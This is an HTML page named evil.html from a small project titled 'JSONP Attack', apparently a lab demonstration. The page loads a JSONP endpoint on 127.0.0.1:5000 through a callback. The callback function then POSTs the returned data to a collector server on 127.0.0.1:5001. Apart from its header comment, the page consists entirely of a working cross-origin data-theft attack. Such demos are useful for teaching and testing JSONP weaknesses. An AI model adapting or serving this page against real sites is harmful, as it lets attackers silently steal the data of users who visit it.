<!-- 
######################################################################
# Project           : JSONP Attack
#
# Program name      : evil.html
#
# Author            : Evan Kivolowitz
#
# Date created      : 02/19/2019
#
# Purpose           : HTML file returned by evil.py
#
# Credit            :
#
# Use                                    Source
#
# Revision History  :
#
# Date        Author              Ref    Revision 
# 02/19/2019  Evan Kivolowitz      1     Created prototype of project.
# 02/28/2019  Evan Kivolowitz      2     Updated headers.
# 02/28/2019  Evan Kivolowitz      3     Renamed file.
#
######################################################################
-->
<html>
<head>
    <title>JSONP</title>
</head>
    <body>
        <p>Feed me your data!</p>
        <script type="application/javascript">
            function foo(data) {
                fetch("http://127.0.0.1:5001/content", { // post data to http://127.0.0.1:5001/content
                    "method": "POST", // set method to post
                    headers: {
                        "Content-Type": "application/json", // set content type to json
                    },
                    "body":  data // put data (from the parameter of callback) to the request body
                })
            }  
        </script>
        <!-- send request, the callback function will be invoked with actual data as parameter -->
        <script type="application/javascript" src="http://127.0.0.1:5000/?callback=foo"></script>
    </body>
</html>
